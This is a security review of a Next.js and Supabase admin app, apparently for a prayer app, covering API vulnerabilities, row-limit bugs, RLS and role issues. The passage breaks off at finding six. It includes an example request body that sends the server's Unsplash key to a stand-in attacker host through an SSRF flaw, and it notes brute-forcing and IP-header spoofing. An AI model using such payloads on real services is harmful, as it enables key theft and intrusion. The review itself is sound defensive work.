# Prevail Prayer Admin — Full Review

**Date:** July 1, 2026
**Scope:** Security, correctness, performance, UX. Every route, API endpoint, server action, and library file was read line by line.
**Verification note:** All code findings below were verified directly in this repo. Two database-level claims (marked "DB — re-verify") came from an earlier partial review pass against the live Supabase project and should be re-confirmed in the Supabase dashboard, since this session's Supabase connection points at a different account (CHC projects) and could not reach `pvcxobbqbugghlqjpmph`.

---

## Executive Summary

The core security architecture is stronger than most admin panels. Every server action runs its own `requireAdmin()` check instead of trusting middleware alone. Audit logging is consistent. The contributor password uses a timing-safe compare. Contributor submissions are hard-coded to unpublished. Next.js 14.2.35 is patched against the known middleware-bypass CVE (CVE-2025-29927).

Five things need real attention, in this order:

1. **Two vulnerabilities in the public image API.** One leaks your Unsplash key to any attacker on the internet; the other lets anyone burn your API quota.
2. **The Scripture page and CSV importers write from the browser with the anon key.** Under strict RLS these writes silently fail (the UI updates optimistically, so it looks like they worked); under loose RLS every app user could write content. Either way it is wrong, and it bypasses audit logging.
3. **A 1,000-row cap will silently corrupt notifications, analytics, and engagement** once you pass 1,000 users. Supabase returns at most 1,000 rows per query unless you paginate. Seven places query unbounded.
4. **The editor role is incoherent.** Middleware lets editors into Devotions/Scripture/Music, but the devotions actions reject them with "Admins only." An editor can open the devotion form, do the work, and lose it on save.
5. **Zero loading and error states.** No `loading.tsx` or `error.tsx` anywhere. Every dashboard page is force-dynamic and query-heavy, so clicks feel dead for seconds and any DB error is an unstyled crash.

---

## CRITICAL — Fix This Week

### 1. `/api/images/track` leaks your Unsplash API key (SSRF)
**File:** `app/api/images/track/route.ts` · **Verified in code.**

This route is public (middleware exempts `/api/images`). It takes a `downloadLocation` URL from the request body and fetches it **with your Unsplash key in the Authorization header**. Anyone can POST:

```json
{ "downloadLocation": "https://attacker.com/steal" }
```

...and your `UNSPLASH_ACCESS_KEY` arrives at their server. It is also a blind SSRF primitive — your server will fetch any URL an attacker chooses.

**Fix:** validate the host before fetching.

```ts
let u: URL;
try { u = new URL(downloadLocation); } catch { return NextResponse.json({ ok: false }, { status: 400 }); }
if (u.hostname !== "api.unsplash.com" || u.protocol !== "https:") {
  return NextResponse.json({ ok: false }, { status: 400 });
}
```

If the key was ever deployed with this route live, **rotate the Unsplash key** after fixing.

### 2. `/api/images/search` is a free, unauthenticated proxy for your API quotas
**File:** `app/api/images/search/route.ts` · **Verified in code.**

Anyone on the internet can hit this endpoint and burn your Unsplash/Pexels quota (Unsplash demo tier is 50 req/hr — one bad actor kills image search for your writers). It is public because the contribute page needs it, but the contribute page already has a password.

**Fix:** require either an admin session or the contributor password on both image routes. Simplest: the client sends the contributor password in an `x-contrib-pass` header, the route verifies it with the existing `checkPassword()` logic, and falls back to a Supabase session check for admin use. Add a basic per-IP rate limit (even an in-memory token bucket helps on a single Vercel region).

### 3. Contributor password can be brute-forced — no attempt limiting
**File:** `app/contribute/actions.ts` · **Verified in code.**

`verifyContributorPassword`, `uploadDevotionImage`, and `submitDevotion` all check the password with **no limit on attempts**. The only rate limit is on successful submissions (15/hour). A script can hammer `verifyContributorPassword` thousands of times per minute. The hash is unsalted SHA-256, so a leaked hash is also cheap to crack offline.

**Fix:**
- Reuse the `contribute_attempts` table to also log failed password attempts per IP; lock out after ~10 failures/hour.
- Note the IP source: `x-forwarded-for` first entry can be client-spoofed. On Vercel, prefer the last entry Vercel appends, or the `x-vercel-forwarded-for` header.
- Longer term, hash with `scrypt` (built into Node's `crypto`) instead of bare SHA-256.

---

## HIGH — Fix Before the App Grows

### 4. The 1,000-row cap silently breaks notifications and analytics
**Files:** `lib/notify.ts` (`loadAudience`), `app/(dashboard)/analytics/page.tsx`, `app/(dashboard)/engagement/page.tsx`, `app/(dashboard)/devotions/page.tsx`, `app/(dashboard)/devotions/actions.ts` (`getNextAvailableDate`), `app/(dashboard)/versions/actions.ts` · **Verified in code — none of these set `.limit()` or paginate.**

Supabase/PostgREST returns **max 1,000 rows per query by default**. Consequences at >1,000 users:

| Feature | What breaks |
|---|---|
| Push notifications | `loadAudience` loads at most 1,000 profiles → users 1,001+ **never receive any push**, with no error |
| Segment counts | Understated on the Notifications page |
| Analytics | Signups, plan breakdown, DAU/WAU/MAU all capped and wrong |
| Engagement | Rows silently missing; feature tables (`journal_entries`, etc.) also cap at 1,000 rows each, so counts drop |
| Devotions list | Caps at 1,000 rows — at one devotion/day plus drafts you hit this in ~2.5 years |
| Version nudge | Devices 1,001+ never get the update push |

**Fix:** paginate with `.range()` in a loop (a small `fetchAll` helper), or better, push the aggregation into the database:
- Engagement counts: one SQL RPC with `GROUP BY user_id` instead of pulling entire tables into memory.
- Analytics: SQL `count(*)` grouped by day/status instead of loading every profile.
This fixes correctness and performance at the same time.

### 5. Browser-side writes with the anon key (Scripture page + CSV importers)
**Files:** `app/(dashboard)/scripture/page.tsx`, `components/ui/ImportScriptures.tsx`, `components/ui/ImportDevotions.tsx` · **Verified in code.** (DB — re-verify: the earlier pass reported `scripture_verses` has RLS with a read-only policy, meaning every admin write on this page is already failing silently today.)

These are the only places in the app that write straight from the browser with the anon-key client. Problems:

- If RLS is strict (read-only), the writes fail and the optimistic UI hides it: deleted verses come back on reload, imports vanish.
- If RLS is loose (any authenticated user can write), any app user could insert devotions/verses — a content-integrity hole in the mobile app itself.
- Either way, these writes bypass the audit log every other mutation goes through.
- `handleDelete` and `toggleFeatured` never check the returned `error` at all.

**Fix:** move all scripture and import writes into server actions using `requireAdmin()` + the service-role client, exactly like devotions/music. You get audit logging for free. Then confirm in the Supabase dashboard that `scripture_verses`, `devotions`, and `devotion_questions` have **no** client-write policies.

### 6. Verify the mobile-